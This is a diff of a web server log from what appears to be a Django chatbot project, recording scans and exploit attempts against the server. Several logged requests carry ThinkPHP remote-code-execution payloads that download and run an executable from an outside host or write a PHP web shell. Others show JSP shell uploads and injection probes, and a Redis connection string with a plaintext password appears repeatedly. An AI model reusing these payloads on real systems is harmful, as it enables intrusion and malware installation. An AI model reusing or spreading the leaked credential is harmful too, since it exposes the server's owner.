@@ -1,26 +1,92 @@
 
-2019-03-23 03:16:05,400 WARNING  Not Found: /FxCodeShell.jsp 
-2019-03-23 03:16:05,406 WARNING  Not Found: /FxCodeShell.jsp::$DATA
-2019-03-23 03:16:05,411 WARNING  Not Found: /FxCodeShell.jsp/
-2019-03-23 03:16:05,416 WARNING  Not Found: /FxCodeShell.jsp
-2019-03-23 11:13:46,622 WARNING  Not Found: /login
-2019-03-23 11:13:47,121 WARNING  Not Found: /customers/1
-2019-03-23 11:13:47,607 WARNING  Not Found: /gs-guide-websocket/803/a8vbaovq/htmlfile
-2019-03-23 11:13:48,103 WARNING  Not Found: /console/login/LoginForm.jsp
-2019-03-23 11:13:48,609 WARNING  Not Found: /index.php
-2019-03-23 11:13:49,111 WARNING  Not Found: /index.php
-2019-03-23 11:13:49,623 WARNING  Not Found: /website/blog/
-2019-03-23 11:13:50,128 WARNING  Not Found: /core/install.php
-2019-03-23 11:13:50,629 WARNING  Not Found: /RPC2
-2019-03-23 11:13:51,132 WARNING  Not Found: /users
-2019-03-23 11:13:51,634 WARNING  Not Found: /flex2gateway/amf
-2019-03-23 11:13:52,742 WARNING  Not Found: /ws_utc/resources/setting/options/general
-2019-03-23 11:13:53,243 WARNING  Not Found: /orders.xhtml
-2019-03-23 11:13:53,790 WARNING  Not Found: /struts2-showcase
-2019-03-23 11:13:54,315 WARNING  Not Found: /invoker/JMXInvokerServlet
-2019-03-23 11:13:54,812 WARNING  Not Found: /invoker/readonly
-2019-03-23 11:13:55,315 WARNING  Not Found: /jmx-console/HtmlAdaptor
-2019-03-23 11:13:55,813 WARNING  Not Found: /manager/html
-2019-03-23 11:13:56,310 WARNING  Not Found: /wls-wsat/CoordinatorPortType
-2019-03-23 11:13:56,809 WARNING  Not Found: /ddd.jsp/
-2019-03-23 11:13:57,310 WARNING  Not Found: /ddd.jsp
+2019-03-24 19:55:36,904 WARNING  Not Found: /nice ports,/Trinity.txt.bak
+done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+120.199.34.100:59491 - - [22/Mar/2019:05:10:06] "WSDISCONNECT /ws/chat/705110.8254717422308904/" - -
+139.162.79.87:51464 - - [22/Mar/2019:05:27:12] "GET /" 200 11772
+119.29.203.241:50076 - - [22/Mar/2019:13:34:42] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/sgqmncughybazsi16860.exe');start%20C:/Windows/temp/sgqmncughybazsi16860.exe" 404 1121
+119.29.203.241:50076 - - [22/Mar/2019:13:34:42] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
+119.29.203.241:50076 - - [22/Mar/2019:13:34:42] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/sgqmncughybazsi16860.exe');start%20C:/Windows/temp/sgqmncughybazsi16860.exe" 404 1121
+139.162.79.87:44984 - - [22/Mar/2019:22:43:17] "GET /" 200 11772
+119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "PUT /FxCodeShell.jsp%20" 404 1121
+119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "PUT /FxCodeShell.jsp::$DATA" 404 1121
+119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "PUT /FxCodeShell.jsp/" 404 1121
+119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
+112.10.183.66:4895 - - [23/Mar/2019:03:18:56] "WSCONNECTING /ws/chat/264480.007834873896237715/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+112.10.183.66:4895 - - [23/Mar/2019:03:18:56] "WSCONNECT /ws/chat/264480.007834873896237715/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.183.66:4895 - - [23/Mar/2019:03:19:08] "WSDISCONNECT /ws/chat/264480.007834873896237715/" - -
+87.120.36.80:26764 - - [23/Mar/2019:11:13:44] "GET /" 200 11772
+87.120.36.80:27368 - - [23/Mar/2019:11:13:45] "GET /" 200 11772
+87.120.36.80:28540 - - [23/Mar/2019:11:13:46] "GET /login" 404 1121
+87.120.36.80:29220 - - [23/Mar/2019:11:13:47] "GET /customers/1" 404 1121
+87.120.36.80:29872 - - [23/Mar/2019:11:13:47] "GET /gs-guide-websocket/803/a8vbaovq/htmlfile?c=_jp.local" 404 1121
+87.120.36.80:30364 - - [23/Mar/2019:11:13:48] "GET /console/login/LoginForm.jsp" 404 1121
+87.120.36.80:31018 - - [23/Mar/2019:11:13:48] "POST /index.php?s=captcha" 404 1121
+87.120.36.80:31800 - - [23/Mar/2019:11:13:49] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=netstat%20-an" 404 1121
+87.120.36.80:32586 - - [23/Mar/2019:11:13:49] "POST /website/blog/" 404 1121
+87.120.36.80:33212 - - [23/Mar/2019:11:13:50] "GET /core/install.php?rewrite=ok&langcode=en" 404 1121
+87.120.36.80:33960 - - [23/Mar/2019:11:13:50] "POST /RPC2" 404 1121
+87.120.36.80:34724 - - [23/Mar/2019:11:13:51] "GET /users" 404 1121
+87.120.36.80:35568 - - [23/Mar/2019:11:13:51] "POST /flex2gateway/amf" 404 1121
+87.120.36.80:36186 - - [23/Mar/2019:11:13:52] "GET /?name={{233*233}}" 200 11772
+87.120.36.80:36906 - - [23/Mar/2019:11:13:52] "GET /ws_utc/resources/setting/options/general" 404 1121
+87.120.36.80:37730 - - [23/Mar/2019:11:13:53] "GET /orders.xhtml" 404 1121
+87.120.36.80:38254 - - [23/Mar/2019:11:13:53] "GET /struts2-showcase" 404 1121
+87.120.36.80:38664 - - [23/Mar/2019:11:13:54] "GET /invoker/JMXInvokerServlet" 404 1121
+87.120.36.80:39292 - - [23/Mar/2019:11:13:54] "GET /invoker/readonly" 404 1121
+87.120.36.80:39880 - - [23/Mar/2019:11:13:55] "GET /jmx-console/HtmlAdaptor" 404 1121
+87.120.36.80:40522 - - [23/Mar/2019:11:13:55] "GET /manager/html" 404 1121
+87.120.36.80:41368 - - [23/Mar/2019:11:13:56] "GET /wls-wsat/CoordinatorPortType" 404 1121
+87.120.36.80:42222 - - [23/Mar/2019:11:13:56] "PUT /ddd.jsp/" 404 1121
+87.120.36.80:42738 - - [23/Mar/2019:11:13:57] "GET /ddd.jsp" 404 1121
+119.29.203.241:59554 - - [23/Mar/2019:22:39:45] "GET /struts2-rest-showcase/orders.xhtml" 404 1121
+119.29.203.241:59554 - - [23/Mar/2019:22:39:45] "GET /index.action" 404 1121
+119.29.203.241:59554 - - [23/Mar/2019:22:39:45] "GET /index.do" 404 1121
+119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "PUT /FxCodeShell.jsp%20" 404 1121
+119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "PUT /FxCodeShell.jsp::$DATA" 404 1121
+119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "PUT /FxCodeShell.jsp/" 404 1121
+119.29.203.241:64681 - - [23/Mar/2019:23:32:16] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
+119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "PUT /FxCodeShell.jsp%20" 404 1121
+119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "PUT /FxCodeShell.jsp::$DATA" 404 1121
+119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "PUT /FxCodeShell.jsp/" 404 1121
+119.29.203.241:52865 - - [24/Mar/2019:11:59:27] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
+183.57.54.43:60507 - - [24/Mar/2019:19:55:36] "GET /" 200 11772
+183.57.54.43:60958 - - [24/Mar/2019:19:55:36] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak" 404 1121
+120.199.34.100:61697 - - [25/Mar/2019:04:41:53] "WSCONNECTING /ws/chat/007920.2573448321966376/" - -
+RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
+120.199.34.100:61697 - - [25/Mar/2019:04:41:53] "WSCONNECT /ws/chat/007920.2573448321966376/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...2019-03-25 04:47:22,925 WARNING  Not Found: //wls-wsat/CoordinatorPortType
